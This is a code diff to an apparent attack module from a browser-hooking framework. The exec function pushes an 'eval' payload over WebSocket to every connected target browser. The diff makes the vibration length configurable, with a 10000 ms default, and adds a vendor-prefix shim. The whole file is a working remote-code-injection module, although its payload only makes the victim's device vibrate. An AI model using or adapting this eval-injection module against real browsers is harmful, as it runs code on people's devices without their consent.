@@ -1,8 +1,14 @@
 exports.data = {
 	//info about the module
-	info: function(step /*optional */) {
-		console.log("Injects a vibrate");
+	info: function(options, step /*optional */) {
+		console.log("If a vibration output is present, let the device vibrate");
+		console.log("OPTIONS:");
+		console.log("  LENGTH: "+options.LENGTH);
 		console.log("Type exec to send the payload");
+	},
+
+	init: function(options) {
+		options.LENGTH="10000";	
 	},
 
 	//handler for parsing responses
@@ -15,7 +21,9 @@ exports.data = {
 
 	//execute the attack
 	exec: function(options,targets,step /* optional */) {
-		var payload = "send(window.navigator.vibrate([10000]))";
+		//var payload = "send({'vibrate': navigator.vibrate(["+options.LENGTH+"])})";
+		var payload = "navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate; send({'vibrate': navigator.vibrate(["+options.LENGTH.trim()+"])})";
+		//windows voor nagiagtor -> maybe a compat shim in a payload?
 		for (var i in targets) {
 			targets[i].sendUTF(JSON.stringify({ request: 'eval', content: payload }));
 			console.log('sent to '+targets[i]);
